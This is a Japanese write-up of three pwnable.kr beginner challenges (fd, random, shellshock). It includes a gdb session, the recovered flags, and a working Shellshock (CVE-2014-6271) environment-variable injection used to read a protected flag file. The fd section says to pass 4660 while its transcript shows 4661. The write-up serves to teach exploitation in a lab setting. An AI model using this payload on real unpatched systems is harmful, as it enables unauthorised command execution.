# pwnable.kr writeup

Toddler's Bottleについてはwriteupが許可されているので、書く。

> 3. challenges in Toddler's Bottle are allowed to freely post the solutions online. However, please refrain from posting solution for challenges in other categories. But if you insist, post easy ones (solved by many people) and do not spoil too much details for the sake of fun.

## fd (1pt)

ソースコードを見ると、コマンドライン引数を1つ受け付けて、そこから0x1234を引いた数を変数fdに代入している。そしてこのfdをファイルディスクリプタとしてファイルを読み込み、そこに`LETMEWIN`と書かれていればflagが得られる。

ファイルディスクリプタは

- 0: stdin
- 1: stdout
- 2: stderr

という3つが既定で存在するから、`fd`に0を代入してやれば、標準入力の内容を読み込んでLETMEWINと比較させることができる。そのため、

1. コマンドライン引数に4660（0x1234）を指定して実行
2. 入力待ちになるので`LETMEWIN`と入力

すると、flagが得られる。

```txt
fd@pwnable:~$ ./fd 4661
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

なお、わかりづらいがflagは`flag.txt`の内容、つまりここでは`mommy! I think I know what a file descriptor is!!`である。

## random (1pt)

ソースコードを見ると`rand()`と入力のxorをとり、それが`0xdeadbeef`ならflagを表示するプログラムであるとわかる。

```c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```

実は`rand()`は毎回同じ値を返す（`srand()`でシード値を変えない限り）。そのため、実行ファイルを解析すれば`rand()`の値を知ることができる。

利便性を考えてローカル環境で解析する。`scp -P2222 random@pwnable.kr:random ./random`で実行ファイルをダウンロードし、gdbで`rand()`の直前まで実行し、`rand()`の出力を読み取る。

```txt
0x0000000000400606 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6b8b4567
$rbx   : 0x00007fffffffe068  →  0x00007fffffffe2f8  →  "/home/kali/random"
$rcx   : 0x00007ffff7fab208  →  0x6774a4cd16a5bce3
$rdx   : 0x0
$rsp   : 0x00007fffffffdf40  →  0x0000000000000000
$rbp   : 0x00007fffffffdf50  →  0x0000000000000001
$rsi   : 0x00007fffffffdf14  →  0x835a7e006b8b4567
$rdi   : 0x00007ffff7fab860  →  0x00007ffff7fab214  →  0x61048c054e508aaa
$rip   : 0x0000000000400606  →  <main+18> mov DWORD PTR [rbp-0x4], eax
$r8    : 0x00007ffff7fab214  →  0x61048c054e508aaa
$r9    : 0x00007ffff7fab280  →  0x0000000000000008
$r10   : 0x00007ffff7de9968  →  0x00100012000027b8
$r11   : 0x00007ffff7e18b10  →  <rand+0> sub rsp, 0x8
$r12   : 0x0
$r13   : 0x00007fffffffe078  →  0x00007fffffffe30a  →  "SHELL=/bin/bash"
$r14   : 0x0
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffdf48│+0x0008: 0x00007ffff7ffdab0  →  0x00007ffff7fcb000  →  0x03010102464c457f
0x00007fffffffdf50│+0x0010: 0x0000000000000001   ← $rbp
0x00007fffffffdf58│+0x0018: 0x00007ffff7dff6ca  →  <__libc_start_call_main+122> mov edi, eax
0x00007fffffffdf60│+0x0020: 0x00007fffffffe050  →  0x00007fffffffe058  →  0x00007ffff7fc3160  →  0x00007ffff7dd8000  →  0x03010102464c457f
0x00007fffffffdf68│+0x0028: 0x00000000004005f4  →  <main+0> push rbp
0x00007fffffffdf70│+0x0030: 0x0000000100400040 ("@"?)
0x00007fffffffdf78│+0x0038: 0x00007fffffffe068  →  0x00007fffffffe2f8  →  "/home/kali/random"
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005f8 <main+4>         sub    rsp, 0x10
     0x4005fc <main+8>         mov    eax, 0x0
     0x400601 <main+13>        call   0x400500 <rand@plt>
 →   0x400606 <main+18>        mov    DWORD PTR [rbp-0x4], eax
     0x400609 <main+21>        mov    DWORD PTR [rbp-0x8], 0x0
     0x400610 <main+28>        mov    eax, 0x400760
     0x400615 <main+33>        lea    rdx, [rbp-0x8]
     0x400619 <main+37>        mov    rsi, rdx
     0x40061c <main+40>        mov    rdi, rax
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "random", stopped 0x400606 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400606 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $eax
$2 = 0x6b8b4567
```

これより`rand()`が0x6b8b4567を返すことがわかった。  
0x6b8b4567 ^ input = 0xdeadbeef より、input = 0xb526fb88 = 3039230856であるから、3039230856を入力すればflagが得られる。

```terminal
random@pwnable:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
```

## shellshock (1pt)

shellshockという脆弱性を用いる問題。念の為bashのバージョンを確認してみると、脆弱性の影響を受けるバージョンであった。

```terminal
shellshock@pwnable:~$ ./bash --version
./bash --version
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

エクスプロイトの例が書かれていたため使ってみる。参考：<https://nikhilh20.medium.com/exploit-bash-shellshock-part-1-ad1636acaf9e>  
`env x='() { :;}; echo Oh No!' ./bash -c "echo Testing!"`というコマンドを実行すると、脆弱性のあるバージョンのみ`echo Oh No!`も実行されてしまう。

```terminal
shellshock@pwnable:~$ env x='() { :;}; echo Oh No!' ./bash -c "echo Testing!"
Oh No!
Testing!
```

このエクスプロイトコードを書き換え、実行可能ファイル`shellshock`に適用してやれば、root権限で任意のコマンドが実行可能となる。これを利用してflagが手に入る。

```terminal
shellshock@pwnable:~$ env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```
